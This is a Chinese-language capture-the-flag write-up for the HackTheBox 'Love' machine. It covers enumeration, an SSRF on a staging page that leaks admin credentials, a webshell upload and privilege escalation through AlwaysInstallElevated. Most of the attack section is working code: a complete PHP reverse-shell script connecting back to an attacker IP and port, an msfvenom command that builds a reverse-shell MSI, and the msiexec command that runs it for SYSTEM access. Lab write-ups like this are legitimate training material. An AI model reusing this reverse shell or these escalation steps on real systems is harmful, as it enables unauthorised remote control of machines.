---
layout:     post
title:      HackTheBox Love
subtitle:   HackTheBox
date:       2021-05-21
author:     heria
header-img: img/post-bg-22.jpg
catalog: true
tags:
---

## 信息收集

![image-20210521133626289](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521133626289.png)

nmap -sC-sV 10.10.10.239

![image-20210521133954459](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521133954459.png)

访问80端口，需要账密登录

![image-20210521134119819](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521134119819.png)

```
gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

![image-20210521134650703](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521134650703.png)

admin是登录页面，443端口和5000端口分别显示bad request和forbidden

我们之前在nmap中还扫描到了另外一个子域名站点

![image-20210521135112693](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521135112693.png)

直接访问失败，需要在/etc/hosts下添加一句

```
10.10.10.239  staging.love.htb
```

![image-20210521135252675](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521135252675.png)

![image-20210521135345084](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521135345084.png)

demo页面如下，页面可以输入url

![image-20210521135929925](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521135929925.png)

尝试访问80,成功

![image-20210521140042325](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521140042325.png)

访问443还是老样子bad request

![image-20210521140111490](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521140111490.png)

访问5000，找到有用信息admin: @LoveIsInTheAir!!!!

![image-20210521140158101](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521140158101.png)

尝试登陆10.10.10.239/admin,用上面的账密成功登录

![image-20210521140600649](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521140600649.png)

## getshell法一

上传webshell，写个一句话

![image-20210521142335858](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521142335858.png)

找到路径

![image-20210521142424746](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521142424746.png)

蚁剑成功拿下

![image-20210521143120910](C:\Users\Heria.Chen.GAIAWORKS\AppData\Roaming\Typora\typora-user-images\image-20210521143120910.png)

之后到user的桌面下找到user.txt，拿到第一个flag

![image-20210521143510780](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521143510780.png)

## getshell法二

第二种拿shell方法

新建exploit.php文件内容如下，将ip和port更改

```
<?php class Sh
{
    private $a = null;
    private $p = null;
    private $os = null;
    private $sh = null;
    private $ds = array(
        0 => array(
            'pipe',
            'r'
        ) ,
        1 => array(
            'pipe',
            'w'
        ) ,
        2 => array(
            'pipe',
            'w'
        )
    );
    private $o = array();
    private $b = 1024;
    private $c = 0;
    private $e = false;
    public function __construct($a, $p)
    {
        $this->a = $a;
        $this->p = $p;
        if (stripos(PHP_OS, 'LINUX') !== false)
        {
            $this->os = 'LINUX';
            $this->sh = '/bin/sh';
        }
        else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false)
        {
            $this->os = 'WINDOWS';
            $this->sh = 'cmd.exe';
            $this->o['bypass_shell'] = true;
        }
        else
        {
            $this->e = true;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
    }
    private function dem()
    {
        $e = false;
        @error_reporting(0);
        @set_time_limit(0);
        if (!function_exists('pcntl_fork'))
        {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        }
        else if (($p = @pcntl_fork()) < 0)
        {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        }
        else if ($p > 0)
        {
            $e = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        }
        else if (posix_setsid() < 0)
        {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        }
        else
        {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        @umask(0);
        return $e;
    }
    private function d($d)
    {
        $d = str_replace('<', '<', $d);
        $d = str_replace('>', '>', $d);
        echo $d;
    }
    private function r($s, $n, $b)
    {
        if (($d = @fread($s, $b)) === false)
        {
            $this->e = true;
            echo "STRM_ERROR: Cannot read from ${n}, script will now exit...\n";
        }
        return $d;
    }
    private function w($s, $n, $d)
    {
        if (($by = @fwrite($s, $d)) === false)
        {
            $this->e = true;
            echo "STRM_ERROR: Cannot write to ${n}, script will now exit...\n";
        }
        return $by;
    }
    private function rw($i, $o, $in, $on)
    {
        while (($d = $this->r($i, $in, $this->b)) && $this->w($o, $on, $d))
        {
            if ($this->os === 'WINDOWS' && $on === 'STDIN')
            {
                $this->c += strlen($d);
            }
            $this->d($d);
        }
    }
    private function brw($i, $o, $in, $on)
    {
        $s = fstat($i) ['size'];
        if ($this->os === 'WINDOWS' && $in === 'STDOUT' && $this->c)
        {
            while ($this->c > 0 && ($by = $this->c >= $this->b ? $this->b : $this->c) && $this->r($i, $in, $by))
            {
                $this->c -= $by;
                $s -= $by;
            }
        }
        while ($s > 0 && ($by = $s >= $this->b ? $this->b : $s) && ($d = $this->r($i, $in, $by)) && $this->w($o, $on, $d))
        {
            $s -= $by;
            $this->d($d);
        }
    }
    public function rn()
    {
        if (!$this->e && !$this->dem())
        {
            $soc = @fsockopen($this->a, $this->p, $en, $es, 30);
            if (!$soc)
            {
                echo "SOC_ERROR: {$en}: {$es}\n";
            }
            else
            {
                stream_set_blocking($soc, false);
                $proc = @proc_open($this->sh, $this->ds, $pps, '/', null, $this->o);
                if (!$proc)
                {
                    echo "PROC_ERROR: Cannot start the shell\n";
                }
                else
                {
                    foreach ($ps as $pp)
                    {
                        stream_set_blocking($pp, false);
                    }
                    @fwrite($soc, "SOCKET: Shell has connected! PID: " . proc_get_status($proc) ['pid'] . "\n");
                    do
                    {
                        if (feof($soc))
                        {
                            echo "SOC_ERROR: Shell connection has been terminated\n";
                            break;
                        }
                        else if (feof($pps[1]) || !proc_get_status($proc) ['running'])
                        {
                            echo "PROC_ERROR: Shell process has been terminated\n";
                            break;
                        }
                        $s = array(
                            'read' => array(
                                $soc,
                                $pps[1],
                                $pps[2]
                            ) ,
                            'write' => null,
                            'except' => null
                        );
                        $ncs = @stream_select($s['read'], $s['write'], $s['except'], null);
                        if ($ncs === false)
                        {
                            echo "STRM_ERROR: stream_select() failed\n";
                            break;
                        }
                        else if ($ncs > 0)
                        {
                            if ($this->os === 'LINUX')
                            {
                                if (in_array($soc, $s['read']))
                                {
                                    $this->rw($soc, $pps[0], 'SOCKET', 'STDIN');
                                }
                                if (in_array($pps[2], $s['read']))
                                {
                                    $this->rw($pps[2], $soc, 'STDERR', 'SOCKET');
                                }
                                if (in_array($pps[1], $s['read']))
                                {
                                    $this->rw($pps[1], $soc, 'STDOUT', 'SOCKET');
                                }
                            }
                            else if ($this->os === 'WINDOWS')
                            {
                                if (in_array($soc, $s['read']))
                                {
                                    $this->rw($soc, $pps[0], 'SOCKET', 'STDIN');
                                }
                                if (fstat($pps[2]) ['size'])
                                {
                                    $this->brw($pps[2], $soc, 'STDERR', 'SOCKET');
                                }
                                if (fstat($pps[1]) ['size'])
                                {
                                    $this->brw($pps[1], $soc, 'STDOUT', 'SOCKET');
                                }
                            }
                        }
                    }
                    while (!$this->e);
                    foreach ($pps as $pp)
                    {
                        fclose($pp);
                    }
                    proc_close($proc);
                }
                fclose($soc);
            }
        }
    }
}
echo '<pre>';
$sh = new Sh('ip', port);
$sh->rn();
echo '</pre>';
unset($sh); /*@gc_collect_cycles();*/ ?>
```

![image-20210521151121305](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521151121305.png)



![image-20210521151251958](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521151251958.png)

攻击机提前开启监听，save之后拿到shell

![image-20210521151351620](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521151351620.png)

## 提权

使用winpeas查找提权漏洞，首先通过下方链接下载，之后上传到目标机器，（可以通过蚁剑上传或者开启http服务curl下载）

```
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
```

之后执行winpeasx64.exe,

![image-20210521152235335](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521152235335.png)

有个AlwaysInstallElevated的漏洞

```
https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated
```

通过msfvenom生成反弹shell msi程序

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f msi -o reverse.msi
```

![image-20210521154055129](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521154055129.png)

传到目标机

![image-20210521154446822](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521154446822.png)

执行

```
msiexec /quiet /qn /i reverse.msi
```

成功拿到system权限

![image-20210521154739399](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521154739399.png)

找到root.txt拿到第二个flag

![image-20210521154942638](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210521154942638.png)

